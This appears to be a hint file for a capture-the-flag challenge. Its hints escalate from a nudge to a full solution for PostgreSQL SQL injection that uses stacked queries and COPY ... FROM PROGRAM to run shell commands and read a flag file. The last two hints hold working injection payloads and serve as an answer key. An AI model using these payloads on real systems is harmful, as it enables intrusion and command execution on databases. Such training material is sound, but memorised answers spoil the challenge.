hints.title: Nudge
hints.content: PostgreSQL has powerful features beyond just reading data. Some features let you interact with the operating system itself.

hints.title: Direction
hints.content: PostgreSQL's COPY command with the PROGRAM option can execute shell commands. Combined with stacked queries, you can run arbitrary OS commands.

hints.title: Approach
hints.content: First create a table to hold the output, then use COPY ... FROM PROGRAM to run a command and store its result. The flag is in /var/flag.txt — read it with 'cat /var/flag.txt'.

hints.title: Near-solution
hints.content: Use stacked queries: '; CREATE TABLE IF NOT EXISTS exfil(line TEXT); COPY exfil FROM PROGRAM 'cat /var/flag.txt'; -- Then search for the exfil table content via UNION or another request.

hints.title: Solution
hints.content: Step 1: Create exfil table and read flag: search for: '; CREATE TABLE IF NOT EXISTS exfil(line TEXT); COPY exfil FROM PROGRAM 'cat /var/flag.txt'; --  Step 2: Read the exfil table: search for: ' UNION SELECT line,1,1 FROM exfil--  The flag from /var/flag.txt will be displayed in the results.
